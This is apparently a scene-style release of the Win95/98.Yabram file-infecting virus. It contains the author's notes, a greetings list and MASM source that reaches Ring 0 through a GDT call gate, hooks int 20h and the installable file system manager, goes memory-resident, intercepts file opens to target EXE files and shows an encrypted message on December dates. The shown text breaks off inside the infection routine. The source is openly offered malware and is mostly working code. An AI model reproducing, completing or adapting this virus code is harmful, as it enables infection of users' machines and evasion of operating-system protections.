
                                Win95/98.Yabram


by SoPinKy.. Made in Argentina.

It is a Win 95/98 virus with hook in the Ifs_Mgr. The virus have a small code
segment... it simulate the host. In the Data segment is the Code of my virus
and there are the Data of virus too.

It pass to Ring 0 using a Technique called "The CallGate"... this technique
consist in install a GDT Call Gate to pass to Ring 0.

Resume of Callgate technique:

        1) Search the GDT to find the descriptors of the Ring 0 code.
        2) Save the first valid entry of the GDT.
        3) Replase the first valid entry of the GDT with a Callgate.
        4) Call the Callgate.
        5) In my Ring 0 code i restore the GDT entry.
        6) Setting the DS, ES, GS, SS register.
        7) Exec the Ring 0 code ;)
        8) RetF... hehehe i back to Ring 3.
        9) Restore the DS, ES, GS, SS.
I will explaine what i just wrote (resume) with more detales in an article
Called "Pass to Ring 0 with C/C++".

The first thing that i'm going to do when i pass to Ring 0
is to be shure about the state of virus's resident.
I hook the int 20h and the new int 20h have the sign "SI".

If int 20h have the sign, the virus will pass control to host and return...
but if the virus reserves memory, i will Hook the int 20h and the Ifs_Mgr and
it is resident now hehehe.

The virus install by itself as a FSD (File System Device)

Once resident the the viral FSD trap the Open call to FSD and infect
only if the file is a PE.

I try to add Sise stealth but i don't have time enough to do it.
But i add new way to do DOS Stealth... this is an optional in my virus.. the
real code don't have Stealth.

The Code has differents parts:

-DirectH-
Here is all proc to pass to Ring 0.1
        Procs:
              InitDirectH : Inicialize the data to pass to Ring 0.
              CallRing0   : Call a proc in Ring 0. This proc call an pass
                            to Ring 0.
              InitRing0   : This may by call for a Ring 0 proc to restore the
                            GDT entry and Set the data segment in ring 0.


-DirectHOOKED-
Here are procs to hook int 20h.
        Procs:
              HOOK_INT20H       : Trap int 20h
              GET_DIR_INT20h    : Get the int 20h address.


-DirectMEM-
Here are a procs to managment the memori in Ring 0.
        Procs:
              MemAlloc          :Reserve memory.


-DirectFILE-
Here are a procs to magnament Ring 0 File IO.
        Procs:
              OPEN_FILE              : Open a file   
              OPEN_FILE_IN_CONTEXT   :  "   "   "
              READ_FILE              : Read a file
              WRITE_FILE             : Write a file
              GET_FILE_SIZE          : Get the size of file

MACROS:
       PACH_INT20  MACRO DIRECCION, FUNCION, VXD_ID ;;Fix the VXDCall


Sorry for my inexperience... hehehe, actually it's one of my first virus
(my first for windows).
When i coded it, i don't have idea of existence of 29a.
My english isn't good enough, so i apologise for that.
I hope that you will understand me.

Thanks:
        Vecna        _ Hey You are a genius... and Argentinian too...
        GriYo        _ You are a genius too ;)
        MrSandman    _ Tnx very much. ;)
        int13h       _ You are crazy man...... Aguante SudAmeRiCa CaRajo!!!   
        darkman      _ Tnx for correct my bad english ;)
        Ypsilon      _ You are fany  :)
        Somnium      _ By to be woman... and Argentinian too...
        ViruBust     _ AVPMan ... hehehe... you are great ;)
        WinterMute   _ Whats happens with EMMA?? hahaha
        Reptille-    _ You are my friends... my youngest friend :)
        Superx       _ A Super Man... A Super Coder... A Super X hehehe
        JQwerty      _ You are my inspiration.......




IMPORTANT:
        The activation dates are 1, 3, 5, 7, 9, 11, 13, 15, 17, 21 ,23,
        25, 27, 29, and 31 of december ;)

NOTE:
        For compile i use the Masm 6.11c (is the DDK assembler)
        For link i use the Link.exe from Visual C++ 5.0.




BEGUIN NOW!!!!
-------------------------------------CUT--------------------------------------
;Compile: ml  /coff /c YABRAM.ASM
;Linking: link -subsystem:WINDOWS -entry:_WinMain -out:YABRAM.exe YABRAM.obj
;               kernel32.lib

.386P
.model FLAT
PUBLIC  _WinMain 

OFFSET32 EQU  <offset flat:> 
VMM_ID EQU 01h

;;;Macro for fixup the VXDCall (int 20h or CD20)
PACH_INT20  MACRO DIRECCION, FUNCION, VXD_ID
        mov WORD PTR [ebp+offset32 DIRECCION],20cdh
        mov WORD PTR [ebp+offset32 DIRECCION+2],FUNCION
        mov WORD PTR [ebp+offset32 DIRECCION+4],VXD_ID
ENDM


;;Simulate the host
_TEXT SEGMENT
_WinMain PROC NEAR C,
            hInstance:DWORD, hPrevInstance:DWORD, AA:DWORD, BB:DWORD
        pusha
        mov     eax,offset32 SALTOTRUEEP
        mov     ebx,offset32 buelve
        sub     ebx,eax
        sub     ebx,3
        mov     DWORD PTR [SALTOTRUEEP+1],ebx  ;;fix up the jmp to back
        mov     eax,offset _WinMain2
        JMP     eax
buelve:
        popa
        leave
        ret
_WinMain ENDP
_TEXT ENDS



;;Structs for 80386Tables as gdt, idt, Ect
MINIHead Struc
        IS_INFECTED     DB ?
        DirPE           DD ?
MINIHead Ends

;;Structs for Pe
PeH Struc
        maggic          DD ?
        Machine         DW ?
        NofSections     DW ?
        time_data       DD ?
        psymbol         DD ?
        nsymbol         DD ?
        SieoffOH        DW ?
        caracteristic   DW ?
PeH Ends

PeOH Struc 
        maggic           DW ?
        MAJLnk           DB ?
        MINLnk           DB ?
        zizeofcode       DD ?
        zizeofinitdata   DD ?
        zizeofnonitdata  DD ?
        EntryPointHEHEHE DD ?
        BASEOFCODE       DD ?
        BASEOFDATA       DD ?
        IMAGEBASE        DD ?
        SectionAligment  DD ?
        FileAligment     DD ?
        NoImPorta        DD ?
        NoImPorta2       DD ?
        NoImPorta3       DD ?
        Reserved         DD ?
SizeOfImagen             DD ?
PeOH Ends



;;Struct for save some important tables as gdt
FPWORD Struc 
        limite          DW ?
        base            DD ?
FPWORD Ends

;;struct to make far JMP unther protected mode
FARJMP Struc
        jmpoffset32     DD  ?
        sel             DW ?
FARJMP Ends

;;Struc of a descriptors of "Callback.... my calback.. hehehe"
Comp Struc
        Offset_L        DW ?
        Sel             DW ?
        Attrib          DW ?
        Offset_H        DW ?
Comp Ends

;;Simple entry in the GDT or LDT tabes
descriptor STRUC
        limit_l         DW ?
        base_l          DW ?
        base_m          DB ?
        access          DB ?
        limit_h         DB ?
        base_h          DB ?
descriptor ENDS 

;;Simple entry in the IDT
idt_descriptor STRUC
        desp_l      DW ?
        sel         DW ?
        tipo_l      DB ?       ;0-4 cont de palabras
        tipo_h      DB ?
        desp_h      DW ?
idt_descriptor ENDS 


;;;;;;;;;;;;;;;;;;;;;Data Segment;;;;;;;;;;;;;;;;;;;;
_DATA SEGMENT
BEG_DATA:
;;Data for Hook Int 20h in the Ring 0
 IDT        DW ?;Here Charge The limit and offset to the  IDT and GDT
 IDT_dir    DD ?
 vector_irq DF 0cacacacacah
 dw 0ffh

 file_EXE DB 256 dup (?)

;;Variables for Selectors in ring 0 and 3
 cs3 DW 0
 ds3 DW 0
 es3 DW 0
 sp3 DW 0
 fs3 DW 0
 gs3 DW 0
 cs0 DW 0
 ds0 DW 0
 es0 DW 0
 sp0 DW 0
 fs0 DW 0
 gs0 DW 0
;;Descriptors of CallBack for copy the GDT entry, that i use for do my
;;Descriptor of Callback in the GDT table.
 CallbackCPY    Comp <?>

;;Pointes to CallBack
 GDT            FPWORD <?>

 SALTO          FARJMP  <?>
 DUMMY          DB 8 dup (?)     ;;It is for Trivials variables
 SECTION_DUMMY  DB 40 dup (?)
 NiniH MINIHead <?>
 SDF_OCUPADO    DB 0       ;;Flag for Ifs. if IFS_ works normaly it must be 1 
 PEHEAD         PeH <?>
 PEOHEAD        PeOH <?>
 HANDLE_VICTIMA DD 0
 REALEP DD 0
 VIRUS_ACTIVO   DB 0      ;;Flag for know where the virus is active
 BASE_VIRUS_MEM DD 0
 MSGCAPTION     DB '#'+1,'#'+1,'#'+1,'#'+1,'#'+1,'#'+1,'$'+1,'$'+1,'$'+1,'$'+1,' '+1,'V'+1,'I'+1,'R'+1,'U'+1,'S'+1,' '+1,'Y'+1,'A'+1,'B'+1
 DB 'R'+1,'A'+1,'N'+1,' '+1,'$'+1,'$'+1,'$'+1,'#'+1,'#'+1,'#'+1,'#'+1,'#'+1,'#'+1
 DD 0
 MSG        DB 'C'+1,'R'+1,'E'+1,'I'+1,'A'+1,'N'+1
 DB            ' '+1,'Q'+1,'U'+1,'E'+1,' '+1,'E'+1
 DB            'S'+1,'T'+1,'A'+1,'B'+1,'A'+1,' '+1
 DB            'M'+1,'U'+1,'E'+1,'R'+1,'T'+1,'O'+1
 DB            ' '+1,'N'+1,'O'+1,'?'+1,'?'+1,'?'+1
 DB            '.'+1,'.'+1,'.'+1,'J'+1,'A'+1,'J'+1
 DB            'A'+1,'J'+1,'A'+1,'J'+1,'A'+1,'.'+1
 DB            ' '+1,' '+1,' '+1,' '+1,' '+1,' '+1
 DB            ' '+1,' '+1,' '+1,' '+1,'^'+1,'^'+1
 DB            'b'+1,'y'+1,' '+1,'S'+1,'o'+1,'P'+1
 DB            'i'+1,'n'+1,'K'+1,'y'+1,'.'+1,' '+1
 DB            'A'+1,'r'+1,'g'+1,'e'+1,'n'+1,'t'+1
 DB            'i'+1,'n'+1,'a'+1,'.'+1,'^'+1,'^'+1
 DB            ' '+1,' '+1,' '+1,' '+1,' '+1,' '+1
 DB            ' '+1,' '+1,' '+1,' '+1,' '+1,' '+1
 DB            'F'+1,'E'+1,'L'+1,'I'+1,'C'+1,'E'+1
 DB            'S'+1,' '+1,'F'+1,'I'+1,'E'+1,'S'+1
 DB            'T'+1,'A'+1,'S'+1
 DD 0
 REFDATA DB '                                    '
 CONTFLAG DB 0
 FIN_DATA:
;_DATA ENDS





;;Code Segment (realy is data segment, but i use it for code of virus;;;;;

BEG_CODE:
;;ALL PROCS NEED TO HAVE DELTA OFFSET IN THE EBP REGISTER

;   DirectHACKERS                         
;-----------------------------Init the variables in DirectH----------------------------;
;--En caso de error EBP+CS0 = 0 y EBP+DS0=0
InitDirectH PROC
pusha
        sgdt    FWORD PTR [offset32 GDT+EBP];get the base and limit in the gdt
        mov     EAX,DWORD PTR [GDT+EBP].base ;get the dir in EAX for scan the gdt
        mov     CX,WORD PTR [GDT+EBP].limite
        shr     CX,3
        xor     bx,bx
bucle_serch_cs:  ;;serch!!
        inc     BX
        add     eax,8
        cmp     WORD PTR [EAX].Descriptor.Limit_L,0ffffh
        jne     no_paso_cs
        cmp     WORD PTR [EAX].Descriptor.Base_L,0
        jne     no_paso_cs
        cmp     BYTE PTR [EAX].Descriptor.Base_M,0
        jne     no_paso_cs
        cmp     BYTE PTR [EAX].Descriptor.access,9bh
        jne     no_paso_cs
        cmp     BYTE PTR [EAX].Descriptor.Limit_H,0cfh
        jne     no_paso_cs
        cmp     BYTE PTR [EAX].Descriptor.Base_H,0
        jne     no_paso_cs
        jmp     paso_cs
no_paso_cs:
        cmp     BX,CX
jne bucle_serch_cs
paso_cs:
        cmp     bx,cx
        je      ERRORRR ;;If the serch not found apropiated Selectors to Ring 0 (it never hapens, hahaha)
        shl     BX,3
        mov     WORD PTR [EBP+CS0],BX  ;;CS0 Finded

;;;;;Serch GDT for find DS Apropiated
        mov     EAX,DWORD PTR [GDT+EBP].base ;cargo la direccion en EAX para serchear la gdt
        mov     CX,WORD PTR [GDT+EBP].limite
        shr     CX,3
        xor     bx,bx
                
bucle_serch_ds:
        inc     BX
        add     eax,8
        cmp     WORD PTR [EAX].Descriptor.Limit_L,0ffffh
        jne     no_paso_ds
        cmp     WORD PTR [EAX].Descriptor.Base_L,0
        jne     no_paso_ds
        cmp     BYTE PTR [EAX].Descriptor.Base_M,0
        jne     no_paso_ds
        cmp     BYTE PTR [EAX].Descriptor.access,93h
        jne     no_paso_ds
        cmp     BYTE PTR [EAX].Descriptor.Limit_H,0cfh
        jne     no_paso_ds
        cmp     BYTE PTR [EAX].Descriptor.Base_H,0
        jne     no_paso_ds
        jmp     paso_ds
no_paso_ds:
        cmp     BX,CX
        jne     bucle_serch_ds

paso_ds:
        cmp     bx,cx
        je      ERRORRR ;;if they arent apropiate selectors
        shl     BX,3
        mov     WORD PTR [EBP+DS0],BX  ;;DS Finded
        mov     WORD PTR [EBP+ES0],BX  
        mov     WORD PTR [EBP+FS0],BX  
        mov     WORD PTR [EBP+GS0],BX  
        popa
        ret

ERRORRR: ;;;;;Error :(..... (it Never Happens, i had comproved :) )
        mov     WORD PTR [EBP+CS0],0
        mov     WORD PTR [EBP+DS0],0
        mov     WORD PTR [EBP+ES0],0
        mov     WORD PTR [EBP+FS0],0
        mov     WORD PTR [EBP+GS0],0
        popa
        ret
InitDirectH EndP

;;Call Ring 0 Proc
;---EAX=offset of the to call, !Warning! the offset is the real in other
;       words: EAX= deltaoffset+offset Proc
CallRing0 PROC
        push    EAX
        mov     EAX,DWORD PTR [GDT+EBP].base ;Get the addres of GDT in EAX 
        add     EAX,8 ;Y replase de 1 entry coz 0 entry dont works

        ;;Copy the first selector for use temporally as callback
        mov     bx,WORD PTR [EAX].Comp.Offset_L
        mov     WORD PTR [CallbackCPY+EBP].Comp.Offset_L,bx
        mov     bx,WORD PTR [EAX].Comp.Sel
        mov     WORD PTR [CallbackCPY+EBP].Comp.Sel,bx
        mov     bx,WORD PTR [EAX].Comp.Attrib
        mov     WORD PTR [CallbackCPY+EBP].Comp.Attrib ,bx
        mov     bx,WORD PTR [EAX].Comp.Offset_H
        mov     WORD PTR [CallbackCPY+EBP].Comp.Offset_H,bx 
             
        ;;Fill the First selector with my callback hahahahaha......hoho...hahaha.. buahahaha
        mov     bx,WORD PTR [CS0+EBP]
        mov     WORD PTR [EAX].Comp.Sel,bx
        mov     WORD PTR [EAX].Comp.Attrib,0ec00h
        pop     ECX
        mov     bx,cx
        shr     ecx,16
        mov     WORD PTR [EAX].Comp.Offset_L,bx
        mov     WORD PTR [EAX].Comp.Offset_H,cx

        ;;;;Set the Far Jmp
        mov     DWORD PTR [SALTO+EBP].FARJMP.jmpoffset32,0
        mov     DWORD PTR [SALTO+EBP].FARJMP.sel,08h
        ;;Is time to Jump Babe
        push    ds
        push    es
        push    gs
        push    fs
 	cli                
        CALL    FWORD PTR [SALTO+EBP] ;Jummmmp yea
	cli
        pop     fs
        pop     gs
        pop     es
        pop     ds
	sti
        RET
CallRing0 ENDP

;;All proc in Ring 0 must beguin with this proc
InitRing0 PROC
        mov     EAX,DWORD PTR [GDT+EBP].base ;get the base and limit in the gdt
        add     EAX,8

;;Restauro the first selector used temporaly as a callback
        mov     bx,WORD PTR [CallbackCPY+EBP].Comp.Offset_L
        mov     WORD PTR [EAX].Comp.Offset_L,bx
        mov     bx,WORD PTR [CallbackCPY+EBP].Comp.Sel
        mov     WORD PTR [EAX].Comp.Sel,bx
        mov     bx,WORD PTR [CallbackCPY+EBP].Comp.Attrib 
        mov     WORD PTR [EAX].Comp.Attrib,bx
        mov     bx,WORD PTR [CallbackCPY+EBP].Comp.Offset_H 
        mov     WORD PTR [EAX].Comp.Offset_H,bx
	cli

        ;;get the data segment for my Criature... ;)
        mov     ds, WORD PTR[DS0+EBP]
        mov     es, WORD PTR[ES0+EBP]
        mov     gs, WORD PTR[GS0+EBP]
	sti
        ret
InitRing0 ENDP


;;;DirectHOOKED

;;hook the int 20 in ring 0
;EBP= delta offset
;ECX=offset of nuew int
;in vector_irq save the old pointer
HOOK_INT20H PROC
        cli
        sidt    FWORD PTR [EBP+IDT]
        mov     ebx,DWORD PTR [EBP+IDT_dir]

;;Change the descriptor in the idt
        mov     EAX,ECX
        mov     word ptr [EBX+8*20H].idt_descriptor.desp_l,ax      
        shr     eax,16
        mov     word ptr [EBX+8*20H].idt_descriptor.desp_h,ax        
        mov     ax,cs
        mov     word ptr [EBX+8*20H].idt_descriptor.sel,ax    
        sti
        ret
HOOK_INT20H ENDP


;EBP= must have delta offset
;Return in vector_irq offset of CD20
GET_DIR_INT20h PROC
      cli
      sidt      FWORD PTR [IDT+ebp]
      mov       ebx,[IDT_dir+ebp]

      ;;Save the Vector to real int 20h
      mov       ax,word ptr [EBX+8*20H].idt_descriptor.desp_l     
      mov       word ptr [EBP+vector_irq],ax
      mov       ax,word ptr [EBX+8*20H].idt_descriptor.desp_h        
      mov       word ptr [EBP+vector_irq+2],ax
      mov       ax,word ptr [EBX+8*20H].idt_descriptor.sel    
      mov       word ptr [EBP+vector_irq+4],ax
      sti
      ret
GET_DIR_INT20h ENDP


;;Miselaneos 

;Get the delta OFFSET
;Return in EBP=DeltaOFFSET
DeltaOFFSET PROC
START: Call SIGUIENTE
SIGUIENTE:
        Mov     EDI,ESP
        Mov     EBP,DWord Ptr ES:[EDI]
        Sub     EBP,Offset32 SIGUIENTE ;lo guardamos en bp
        Inc     ESP
        Inc     ESP
        Inc     ESP
        Inc     ESP
        ret
DeltaOFFSET ENDP


;;; DirectMEM
;Alloc memory in the heap of the system
;EBX=nbytes for alloc
;Retun in EAX the pointer allocated
MemAlloc proc
        xor     eax,eax
        push    eax
        push    EBX
        PATCH1  LABEL FAR
        int     20h
        DW      79
        DW      VMM_ID
        pop     ebx
        pop     ebx
        ret
MemAlloc endp


;;;DirectFILE
;;;ESI==>>> name of the File
;;;EAX return the handle of file
;;;EBP=Base of the virus in memory
OPEN_FILE PROC
        mov     eax,ebp
        add     eax,OFFSET_ABS_SDF_OCUPADO
        mov     BYTE PTR [EAX],1
        push    ebp
        mov     eax,0d500h
        mov     ebx,0003h 
        mov     ecx,0000h
        mov     dl,01h
        mov     dh,00h
        PATCH2  LABEL FAR
        int     20h
        dw      50
        dw      40h
        pop     ebp
        push    eax
        mov     eax,ebp
        add     eax,OFFSET_ABS_SDF_OCUPADO
        mov     BYTE PTR [EAX],0
        pop     eax
        ret
OPEN_FILE ENDP


;;;ESI==>>> nombre of the File
;;;EAX return the handle of file
;;;EBP=Base of the virus in memory
OPEN_FILE_IN_CONTEXT PROC
        mov     eax,ebp
        add     eax,OFFSET_ABS_SDF_OCUPADO
        mov     BYTE PTR [EAX],1
        push    ebp
        mov     eax,0d501h
        mov     ebx,0003h ;;;;;;;provar con 6 o 7
        mov     ecx,0000h
        mov     dl,01h
        mov     dh,00h
        PATCH2b LABEL FAR
        int     20h
        dw      50
        dw      40h
        pop     ebp
        push    eax
        mov     eax,ebp
        add     eax,OFFSET_ABS_SDF_OCUPADO
        mov     BYTE PTR [EAX],0
        pop     eax
        ret
OPEN_FILE_IN_CONTEXT ENDP



;;EBX==>HANDLE
;;ECX==>COUNT
;;EDX==>POS
;;ESI==>BUFFERS
;;EBP=base of the virus in memory
READ_FILE PROC
        mov     eax,ebp
        add     eax,OFFSET_ABS_SDF_OCUPADO
        mov     BYTE PTR [EAX],1
        push    ebp

        mov     eax,0d600h
        PATCH3  LABEL FAR
        int     20h
        dw      50
        dw      40h

        pop     ebp
        push    eax
        mov     eax,ebp
        add     eax,OFFSET_ABS_SDF_OCUPADO
        mov     BYTE PTR [EAX],0
        pop     eax
        ret
READ_FILE ENDP

;;EBX==>HANDLE
;;ECX==>COUNT
;;EDX==>POS
;;ESI==>BUFFERS
WRITE_FILE PROC
        mov     eax,ebp
        add     eax,OFFSET_ABS_SDF_OCUPADO
        mov     BYTE PTR [EAX],1
        push    ebp

        mov     eax,0d601h
        PATCH4  LABEL FAR
        int     20h
        dw      50
        dw      40h

        pop     ebp
        push    eax
        mov     eax,ebp
        add     eax,OFFSET_ABS_SDF_OCUPADO
        mov     BYTE PTR [EAX],0
        pop     eax
        ret
WRITE_FILE ENDP

;;EBX==>HANDLE
CLOSE_FILE PROC
        mov     eax,ebp
        add     eax,OFFSET_ABS_SDF_OCUPADO
        mov     BYTE PTR [EAX],1
        push    ebp
        mov     eax,0d700h
        PATCH5  LABEL FAR
        int     20h
        dw      50
        dw      40h
        pop     ebp
        push    eax
        mov     eax,ebp
        add     eax,OFFSET_ABS_SDF_OCUPADO
        mov     BYTE PTR [EAX],0
        pop     eax
        ret
CLOSE_FILE ENDP

;;EBX==>HANDLE
;;EAX Return the File Size
GET_FILE_SIZE PROC
        mov     eax,ebp
        add     eax,OFFSET_ABS_SDF_OCUPADO
        mov     BYTE PTR [EAX],1
        push    ebp
        mov     eax,0d800h
        PATCH6  LABEL FAR
        int     20h
        dw      50
        dw      40h
        pop     ebp
        push    eax
        mov     eax,ebp
        add     eax,OFFSET_ABS_SDF_OCUPADO
        mov     BYTE PTR [EAX],0
        pop     eax
        ret
GET_FILE_SIZE ENDP



;;;-------Beguin the Show hehehe--------;;;
;; BODY OF MY VIRUS IN RING 0

;;Here Beguin the Ring 0 Virus
CuerpoDelVirusEnRING0 PROC
CALL InitRing0
        pusha

;;;Loock for my virus in memory
        CALL    GET_DIR_INT20h 
        mov     eax,DWORD PTR [ebp+vector_irq]
        mov     bh,byte ptr [eax-2]
        cmp     bh,'S' 
        jne     instalar
        mov     bh,byte ptr [eax-1]
        cmp     bh,'I' 
        je      ya_esta_en_memoria
instalar:

;;Enable infeccion Flag
        mov     eax,offset32 SDF_OCUPADO
        mov     byte ptr [ebp+eax],0
        push    ebp

;;Alocate Memory
        mov     ebx,SIZE_VIRUS
        CALL    MemAlloc
        MOV     EBX,EAX       ;EAX y EBX=Base For Data
        MOV     DWORD PTR [EBP+BASE_VIRUS_MEM],EAX
        pop     ebp

;;copy my virus 
        MOV     ESI,OFFSET32 BEG_DATA
        ADD     ESI,EBP
        MOV     EDI,EAX
        mov     ecx,SIZE_VIRUS
	cld
        rep     movsb

;;change the JMP in my CD20
        add     EAX,OFFSET_A_SALTO_A_OLD_IRQ+3
        ADD     EBX,OFFSET_VECTTOR_IRQ ;EBX=BASE DE LOS DATOS
        mov     DWORD PTR [EAX],EBX

;;;;Change the CD20
        MOV     EAX,DWORD PTR [EBP+BASE_VIRUS_MEM]
        add     EAX,OFFSET_INT20   ;offset of my CD20  
        mov     ECX,EAX           
        add     eax,ebp
        CALL    HOOK_INT20H
        MOV     EAX,DWORD PTR [EBP+BASE_VIRUS_MEM]

;;;IFS HOOK
        cli
        add     eax,OFFSET_ABS_FILE_HOOKED;
        push    eax
        PATCH7  LABEL FAR
        int     20h
        dw      103
        dw      40h  ;IFS_ID
        mov     ebx,dword ptr [EAX] ;;Fix the ptr to the olth ifs
        pop     eax                 ;;clean the garbadge
        MOV     EAX,DWORD PTR [EBP+BASE_VIRUS_MEM]
        add     eax,OFFSET_A_SALTO_A_OLD_IFS+1
        sub     ebx,eax
        sub     ebx,4 ;ebx=offset a la bieja IFS_FILEIO
        mov     DWORD PTR [EAX],EBX  ;EAX=PTR to jmp IFS_FILEIO
        sti
ya_esta_en_memoria:
        popa
	retf
CuerpoDelVirusEnRING0 ENDP



;;;;NEW ENTRY POINT
_WinMain2:
pusha
        CALL    DeltaOFFSET   
        CALL    InitDirectH
        ;;;;Fixup all int 20h Call

	PACH_INT20  PATCH1,79,VMM_ID
        PACH_INT20  PATCH2,50,40h
	PACH_INT20  PATCH3,50,40h
	PACH_INT20  PATCH4,50,40h
	PACH_INT20  PATCH5,50,40h
	PACH_INT20  PATCH6,50,40h
	PACH_INT20  PATCH7,103,40h  
	PACH_INT20  PATCH8,03h,01h
	PACH_INT20  PATCH9,04h,17h

        CMP     WORD PTR [EBP+CS0],0  ;;;;if can't pass to ring 0 (it NEVER!!! hapens)
        JE      no_ring0
        mov     eax,OFFSET32 BEG_DATA
        add     eax,ebp
        add     eax,OFFSET_ABS_RING0INSTALER
        CALL    CallRing0 
no_ring0:
        popa
;;Back To the Host
SALTOTRUEEP:
        DB      0e9h  ;;Codigo Maquina del JMP desp
        DD      0000
;;;;;;END TO NEW ENTRY POINT



;;INT 20 HOOKED
DB 'S'  ;;marc of recident
DB 'I'
Nueva_int: 
        sti 
        pusha

;;Calcule the Offset where beguin the data
        Call    SIGG
        SIGG:
        Mov     EDI,ESP
        Mov     EAX,DWord Ptr SS:[EDI]
        Inc     ESP
        Inc     ESP
        Inc     ESP
        Inc     ESP
;;EAX=offsed of CALL SIGG
        sub     eax,2     ;del sti y del pusha
        sub     eax,5     ;del call
        sub     eax,OFFSET_INT20
        sub     eax,SIZE_DATA 
        mov     ebp,eax 

;;EBP=Base of Data 
        popa
;;End of my Int 20h hahahaha
SALTO_A_OLD_IRQ:
        DB      36h
        DW      02DFFh     ;It is filled when Virus is load in memory
        DD      0000


;;;;;;;/////IFS_HOOKED\\\\\\\;;;;;;
FILE_HOOKED:
        cli 
        pusha
;;;;;Calcule the Offset where beguin the data
        Call    SIGGFILEHOOK
SIGGFILEHOOK:
        Mov     EDI,ESP
        Mov     EAX,DWord Ptr SS:[EDI]
        Inc     ESP
        Inc      ESP
        Inc     ESP
        Inc     ESP
;;EAX=offsed de CALL SIGG
        sub     eax,2     ;for the sti and the pusha
        sub     eax,5     ;del call
        sub     eax,OFFSET_ABS_FILE_HOOKED
        mov     ebp,eax 

;EBP=Base of Data
        mov     eax,ebp   ;if the flag de SDF_OCUPADO=1, them the IF

        mov     eax,ebp  ;;if the SDF_OCUPADO=1 them the FSD may works normals
        add     eax,OFFSET_ABS_SDF_OCUPADO; 
        cmp     BYTE PTR [EAX],1
        je      SALTO_A_OLD_IFS_INTERNO

prosesa:         
        mov     eax,esp
        add     eax,24h  ;20 is for the Pusha
                     ;+4 for have the parameter..y must skyp return ptr
        cmp     DWORD PTR ss:[EAX+4],36  ;if a file is open?.... hehehe
        je      LEE_FILE

;;////it is optionals!!!
        cmp     DWORD PTR ss:[EAX+4],2  ;if it is for stealth??
        je      Stealth
;;////it is optionals!!!
        cmp     DWORD PTR ss:[EAX+4],38 ;if it is for stealth??
        je      Stealth


jmp SALTO_A_OLD_IFS_INTERNO

LEE_FILE:
;;;;;;;Activaction
;;;;;;;See if the date is for activation
        push    eax
        mov     al,8    ;;;mes
        out     70h,al
        in      al,71h
        mov     bl,al
        mov     al,7    ;;;dia
        out     70h,al
        in      al,71h
        mov     bh,al  

;;;;;DX=DAY:MONTH
        cmp     bx,0112h
        je      ACTIVO
        cmp     bx,0312h
        je      ACTIVO
        cmp     bx,0512h
        je      ACTIVO
        cmp     bx,0712h
        je      ACTIVO
        cmp     bx,0912h
        je      ACTIVO
        cmp     bx,1112h
        je      ACTIVO
        cmp     bx,1312h
        je      ACTIVO 
        cmp     bx,1512h
        je      ACTIVO
        cmp     bx,1712h
        je      ACTIVO
        cmp     bx,1912h
        je      ACTIVO
        cmp     bx,2112h
        je      ACTIVO
        cmp     bx,2312h
        je      ACTIVO
        cmp     bx,2412h
        je      ACTIVO
        cmp     bx,2412h
        je      ACTIVO
        jmp     NO_ACTIVO

ACTIVO:
        inc     byte ptr [ebp+OFFSET_ABS_CONTFLAG]
        cmp     byte ptr [ebp+OFFSET_ABS_CONTFLAG],30
        jne     noactperflag
        mov     byte ptr [ebp+OFFSET_ABS_CONTFLAG],0

        mov     eax,ebp
        add     eax,OFFSET_ABS_MSGC
        cmp     BYTE PTR [eax],'#'+1
        jne     ya_esta_desencriptado
        mov     ecx,32
desencrp_MSGC:
        dec     BYTE PTR [eax]
        inc     eax
        dec     ecx
        jnz     desencrp_MSGC

        mov     eax,ebp
        add     eax,OFFSET_ABS_MSG
        mov     ecx,105
desencrp_MSG:
        dec     BYTE PTR [eax]
        inc     eax
        dec     ecx
        jnz     desencrp_MSG
        

ya_esta_desencriptado:
        cli
        PATCH8  LABEL FAR
        int     20h 
        DW       0003h
        DW      0001h    ;Get VM
        mov     eax, 00001000h
        mov     ecx, OFFSET_ABS_MSG
        mov     edi, OFFSET_ABS_MSGC
        mov     esi, 0
        mov     edx, OFFSET_ABS_REFDATA
        ADD     ecx,ebp
        ADD     edi,ebp
        ADD     edx,ebp
        PATCH9  LABEL FAR
        int     20h 
        DW      04h
        DW      17H   
        sti
noactperflag:
        pop     eax
        jmp     SALTO_A_OLD_IFS_INTERNO
NO_ACTIVO:
        pop     eax


;;Get the name of File
        mov     eax,DWORD PTR ss:[EAX+20]
        mov     edi,DWORD PTR ss:[EAX+44]
        mov     ecx,256
        mov     ax,0000h       ;until the end of the name
        cld
        repnz   SCASW
        jnz     NO_ES_PE_EXE
        mov     eax,edi
        sub     edi,8           ;Go to the beguin od the extencion
        cmp     WORD PTR ss:[EDI],0045h
        je      PASO
        cmp     WORD PTR ss:[EDI],0065h
        je      PASO
        jmp     NO_ES_PE_EXE
PASO:
        add     edi,2
        cmp     WORD PTR ss:[EDI],0058h
        je      PASO2
        cmp     WORD PTR ss:[EDI],0078h
        je      PASO2
        jmp     NO_ES_PE_EXE
PASO2:
        add     edi,2
        cmp     WORD PTR ss:[EDI],0045h
        je      ES_EXEexe
        cmp     WORD PTR ss:[EDI],0065h
        je      ES_EXEexe
        jmp     NO_ES_PE_EXE

ES_EXEexe:
;;Dont infect the conagent.exe!!!
        xor     ecx,ecx
        mov     edi,eax
        sub     edi,12
        cmp     WORD PTR ss:[EDI],0054h
        je      es_igual_T
        cmp     WORD PTR ss:[EDI],0074h
        jne     no_es_igual_T

es_igual_T:
        inc     ecx
no_es_igual_T:

        sub     edi,2
        cmp     WORD PTR ss:[EDI],004eh
        je      es_igual_N
        cmp     WORD PTR ss:[EDI],006eh
        jne     no_es_igual_N

es_igual_N:
        inc ecx
no_es_igual_N:

        sub     edi,6
        cmp     WORD PTR ss:[EDI],0041h
        je      es_igual_A
        cmp     WORD PTR ss:[EDI],0061h
        jne     no_es_igual_A
es_igual_A:
        inc     ecx
no_es_igual_A:
        sub     edi,6
        cmp     WORD PTR ss:[EDI],0043h
        je      es_igual_C
        cmp     WORD PTR ss:[EDI],0063h
        jne     no_es_igual_C
es_igual_C:
        inc     ecx
no_es_igual_C:
        cmp     ecx,4
        je      NO_ES_PE_EXE    


;;;Pass unicoide name to ascii
        mov     eax,esp
        add     eax,20h                   ;is for pusha
        add     eax,4                     
        mov     eax,DWORD PTR ss:[EAX+20] ;;Address of ioreq
        mov     edi, DWORD PTR ss:[EAX+44];;Address of ir_Path

;;Pass to ascii
        mov     eax,ebp
        add     eax,OFFSET_ABS_file_EXE

buclecpy:
        mov     bx,WORD PTR [EDI]
        cmp     bx,0
        je      listocpy
        mov     byte ptr [eax],bl
        inc     eax
        add     EDI,2
        jmp     buclecpy
listocpy:
        mov     word ptr [eax],0  ;;set a Null to the end



;;ok it is a .EXE file
        mov     eax,ebp
